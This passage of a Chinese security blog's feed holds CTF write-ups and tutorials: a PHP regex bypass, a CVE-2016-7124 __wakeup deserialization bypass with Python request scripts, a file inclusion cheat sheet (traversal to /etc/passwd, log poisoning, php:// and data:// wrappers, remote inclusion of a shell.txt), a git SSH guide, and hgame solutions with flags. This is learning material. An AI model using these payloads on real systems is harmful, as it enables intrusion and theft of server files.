id="0x12-数字验证正则绕过"><a href="#0x12-数字验证正则绕过" class="headerlink" title="0x12.  数字验证正则绕过"></a>0x12.  数字验证正则绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码题意，进行绕过<br>payload: password=42.000000000000e-0    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-extract变量覆盖&quot;&gt;&lt;a href=&quot;#0x01-extract变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;0x01. extract变量覆盖&quot;&gt;&lt;/a&gt;0x01. extract变量覆盖&lt;/h2&gt;&lt;figure class=&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化绕过__wakeup方法</title>
    <link href="http://yoursite.com/2019/04/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87__wakeup%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2019/04/21/PHP反序列化绕过__wakeup方法/</id>
    <published>2019-04-21T10:12:23.000Z</published>
    <updated>2019-05-13T12:45:05.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01.前言"></a>0x01.前言</h2><p>做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p><h2 id="0x02-public-private-protected的序列化"><a href="#0x02-public-private-protected的序列化" class="headerlink" title="0x02. public private protected的序列化"></a>0x02. public private protected的序列化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Kage&#123;</span><br><span class="line">public $name=&apos;kxj&apos;;</span><br><span class="line">private $name2=&apos;kxj&apos;;</span><br><span class="line">protected $name3=&apos;kxj&apos;;</span><br><span class="line"></span><br><span class="line">public function getName()&#123;</span><br><span class="line">var_dump($this);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new Kage());</span><br><span class="line"></span><br><span class="line">$a = unserialize($_GET[&apos;id&apos;]);</span><br><span class="line">$a-&gt;getName();</span><br></pre></td></tr></table></figure><p>运行得到结果：<br><code>O:4:&quot;Kage&quot;:3:{s:5:&quot;name1&quot;;s:3:&quot;kxj&quot;;s:11:&quot;Kagename2&quot;;s:3:&quot;kxj&quot;;s:8:&quot;*name3&quot;;s:3:&quot;kxj&quot;;}</code><br>属性值都一样，不同的在属性名</p><ul><li>public：s:5:”name1”</li><li>private：s:11:”Kagename2”</li><li>protected：s:8:”*name3”</li></ul><p>细心观察，会发现private和protected方法长度与所标识的不一样，实际原因是因为浏览器或命令行无法输出某些字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/ctf/guosai/test/test.php&quot;</span><br><span class="line"></span><br><span class="line">h = requests.get(url).content</span><br><span class="line"></span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure></p><p>通过content输出可以发现<br><code>b&#39;O:4:&quot;Kage&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;kxj&quot;;s:11:&quot;\x00Kage\x00name2&quot;;s:3:&quot;kxj&quot;;s:8:&quot;\x00*\x00name3&quot;;s:3:&quot;kxj&quot;;}&#39;</code></p><ul><li>public：s:5:”name1”</li><li>private：s:11:”\x00Kage\x00name2”</li><li>protected：s:8:”\x00*\x00name3”</li></ul><p>研究可以发现，<code>public</code>修饰变量时原样保留，<code>private</code>修饰变量时为<code>\x00类名\x00变量名</code>，<code>protected</code>修饰变量时为<code>\x00*\x00变量</code>。</p><p>写脚本用<code>\x00</code>时会报错，可以使用<code>%00</code>或者<code>\0</code>来填充<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">p1 = &apos;O:4:&quot;Kage&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;s:11:&quot;%00Kage%00name2&quot;;s:4:&quot;flag&quot;;s:8:&quot;%00*%00name3&quot;;s:4:&quot;flag&quot;;&#125;&apos;</span><br><span class="line">p2 = &apos;O:4:&quot;Kage&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;s:11:&quot;\0Kage\0name2&quot;;s:4:&quot;flag&quot;;s:8:&quot;\0*\0name3&quot;;s:4:&quot;flag&quot;;&#125;&apos;</span><br><span class="line">url = &quot;http://127.0.0.1/ctf/guosai/test/test.php?id=&quot; + p2</span><br><span class="line"></span><br><span class="line">h = requests.get(url).content</span><br><span class="line"></span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure></p><p>结果将<code>kxj</code>改为了<code>flag</code><br><img src="/img/1555855975423.png" alt="Alt text"></p><h2 id="0x03-wakeup魔术方法绕过"><a href="#0x03-wakeup魔术方法绕过" class="headerlink" title="0x03. __wakeup魔术方法绕过"></a>0x03. __wakeup魔术方法绕过</h2><p>CVE-2016-7124：简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">private $file;</span><br><span class="line"></span><br><span class="line">public function __construct($file) &#123;</span><br><span class="line">$this-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo $this-&gt;file;</span><br><span class="line">&#125;</span><br><span class="line">public function __wakeup() &#123;</span><br><span class="line">$this-&gt;file = NULL;</span><br><span class="line">echo &quot;wakeup&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// $s = new Test(&apos;index&apos;);</span><br><span class="line">// $g = serialize($s);</span><br><span class="line">// echo $g;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[&apos;id&apos;]);</span><br></pre></td></tr></table></figure></p><p>意思大概就是反序列化之后，会自动调用<code>__wakeup</code>方法将文件名设置为空。<br><code>O:4:&quot;Test&quot;:1:{s:10:&quot;%00Test%00file&quot;;s:4:&quot;flag&quot;;}</code><br><img src="/img/1555860027596.png" alt="Alt text"></p><p>将对象属性设置为2<br><code>O:4:&quot;Test&quot;:2:{s:10:&quot;%00Test%00file&quot;;s:4:&quot;flag&quot;;}</code><br><img src="/img/1555860082394.png" alt="Alt text"><br>成功控制file变量输出flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01.前言&quot;&gt;&lt;/a&gt;0x01.前言&lt;/h2&gt;&lt;p&gt;做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。&lt;br&gt;影
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞小结</title>
    <link href="http://yoursite.com/2019/03/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/03/31/文件包含漏洞/</id>
    <published>2019-03-31T10:32:18.000Z</published>
    <updated>2019-05-13T12:45:50.095Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见函数有：include()、require()<br>区别：</p><ol><li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li><li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ol><li><p>包含目录文件<br>?file=test.txt<br>如果里面的内容是php，则内容会被当成php执行,不是php则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息)</p><p> ?file=./../../test.txt<br> <code>./</code>当前目录，<code>../</code>上一级目录，这样的遍历目录来读取文件</p></li><li><p>包含日志文件<br>无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件(错误、访问文件都行),注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录<br>常见几个路径<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br><img src="/img/1553776213389.png" alt="Alt text"></p></li><li><p>包含session文件<br>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p></li><li><p>利用php流filter(过滤器，可以用来读取php文件内容，不需要开启allow_url_include)<br>?file=php://filter/convert.base64-encode/resource=index.php</p></li></ol><h2 id="本地文件包含小姿势"><a href="#本地文件包含小姿势" class="headerlink" title="本地文件包含小姿势"></a>本地文件包含小姿势</h2><p>审计中可以见这样的包含模板文件：<br><code>&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;</code></p><ol><li>%00截断<br> /etc/passwd%00<br> （需要magic_quotes_gpc=off，PHP小于5.3.4有效）</li></ol><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ol><li>远程代码执行<br>?file=[http|https|ftp]://example.com/shell.txt<br>(需要allow_url_fopen=On并且 allow_url_include=On)</li><li>利用php流input(接收POST过来的值)<br>?file=php://input<br>(需要allow_url_include=On)</li><li>利用data URIs<br>?file=data://text/plain;base64,base64编码的payload<br>(需要allow_url_include=On)</li></ol><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ol><li>phar伪协议<br>?file=phar://test.jpg/test.php<br>利用方法，先新建一个php文件，然后在php文件中写入phpinfo，然后进行压缩为zip文件，重命名为jpg文件，然后进行phar包含</li><li>zip伪协议<br>?file=zip://C:/www/K4ge/CodeAduit/1000/include/test.jpg%23test.php<br>必须使用绝对路径</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。&lt;br&gt;常见函数
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>同一台电脑连接多个github仓库</title>
    <link href="http://yoursite.com/2019/02/03/%E5%90%8C%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E5%A4%9A%E4%B8%AAgithub%E4%BB%93%E5%BA%93/"/>
    <id>http://yoursite.com/2019/02/03/同一台电脑连接多个github仓库/</id>
    <published>2019-02-03T08:42:16.000Z</published>
    <updated>2019-05-13T12:46:30.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-生成密钥"><a href="#0x01-生成密钥" class="headerlink" title="0x01.生成密钥"></a>0x01.生成密钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;yourname@email.com&quot;</span><br></pre></td></tr></table></figure><p>分别生成两次公钥，可以得到两组公钥和私钥</p><h2 id="0x02-在github上添加公钥"><a href="#0x02-在github上添加公钥" class="headerlink" title="0x02. 在github上添加公钥"></a>0x02. 在github上添加公钥</h2><p>不解释</p><h2 id="0x03-添加config配置文件"><a href="#0x03-添加config配置文件" class="headerlink" title="0x03. 添加config配置文件"></a>0x03. 添加config配置文件</h2><p>在.ssh文件夹下添加config文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#第一个账号 Bu1uokage</span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">#第二个账号 K4ge</span><br><span class="line">Host K4ge</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_K4ge</span><br></pre></td></tr></table></figure></p><p>说明：</p><ol><li>Host 可以是自定义的随机别名，如<code>K4ge</code>，在后面clone时会用到</li><li>Hostname 就默认配置就好</li><li>User默认就使用git就好</li><li>IdentityFile即公钥对应目录</li></ol><h2 id="0x04-SSH连接"><a href="#0x04-SSH连接" class="headerlink" title="0x04. SSH连接"></a>0x04. SSH连接</h2><p>如果出现Could not open a connection to your authentication agent错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br></pre></td></tr></table></figure></p><p>可以使用上述命令解决</p><p>添加ssh到agent中，<code>ssh-add -D</code>将agent中的删除，然后再依次添加。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-add id_rsa</span><br><span class="line">ssh-add id_rsa_K4ge</span><br><span class="line">ssh-add -l</span><br></pre></td></tr></table></figure></p><p>测试连接远程github服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T K4ge</span><br></pre></td></tr></table></figure></p><h2 id="0x05-git实战"><a href="#0x05-git实战" class="headerlink" title="0x05. git实战"></a>0x05. git实战</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:K4ge/gitskills.git</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@K4ge:K4ge/gitksills.git</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;new README&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>先删除当前为github.com的remote<br>然后添加新的remote为K4ge，然后就可以push到新账号了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-生成密钥&quot;&gt;&lt;a href=&quot;#0x01-生成密钥&quot; class=&quot;headerlink&quot; title=&quot;0x01.生成密钥&quot;&gt;&lt;/a&gt;0x01.生成密钥&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="other" scheme="http://yoursite.com/categories/other/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>hgame-web-week1</title>
    <link href="http://yoursite.com/2019/02/03/hgame%E8%8D%89%E7%A8%BF/"/>
    <id>http://yoursite.com/2019/02/03/hgame草稿/</id>
    <published>2019-02-03T05:45:23.000Z</published>
    <updated>2019-05-13T12:46:12.502Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-谁吃了我的flag"><a href="#1-谁吃了我的flag" class="headerlink" title="1. 谁吃了我的flag"></a>1. 谁吃了我的flag</h2><p><img src="/img/1548569716058.png" alt=""><br>获取vim备份文件<br>vim自动退出会临时备份隐藏文件 .xxx.swp<br>用linux打<br><code>vim -r .xxx.swp</code> 可以恢复备份文件<br>hgame{3eek_diScl0Sure_fRom+wEbsit@}</p><h2 id="2-换头大作战"><a href="#2-换头大作战" class="headerlink" title="2. 换头大作战"></a>2. 换头大作战</h2><p><img src="/img/1548570653300.png" alt=""><br>输入框输入，要求使用post<br>post输入<br>要求使用waterfox，更改<br>要求bilibili登录<br>最后得到flag<br>hgame{hTTp_HeaDeR_iS_Ez}</p><h2 id="3-very-easy-web"><a href="#3-very-easy-web" class="headerlink" title="3. very easy web"></a>3. very easy web</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&apos;id&apos;])!==FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;干巴爹/img/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">if($_GET[&apos;id&apos;] === &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>urldecode()函数的危险问题<br>php会进行自动解码一次<br>如果使用这个函数，可以通过二次编码绕过前面的过滤<br>hgame{urlDecode_Is_GoOd}</p><h2 id="4-can-you-find-me"><a href="#4-can-you-find-me" class="headerlink" title="4. can you find me"></a>4. can you find me</h2><p><img src="/img/1548571660564.png" alt=""><br><img src="/img/1548571688433.png" alt=""><br>从返回包头找到密码woyaoflag<br>发送post密码得到flag<br>hgame{f12_1s_aMazIng111}</p><h2 id="5-Hidden-Image-in-LSB"><a href="#5-Hidden-Image-in-LSB" class="headerlink" title="5. Hidden Image in LSB"></a>5. Hidden Image in LSB</h2><p>有StegSolve打开，按下面左右调试即可<br><img src="/img/1548572207626.png" alt=""><br>hgame{LSB_is_easy_for_u}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-谁吃了我的flag&quot;&gt;&lt;a href=&quot;#1-谁吃了我的flag&quot; class=&quot;headerlink&quot; title=&quot;1. 谁吃了我的flag&quot;&gt;&lt;/a&gt;1. 谁吃了我的flag&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/1548569716058.png
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
</feed>
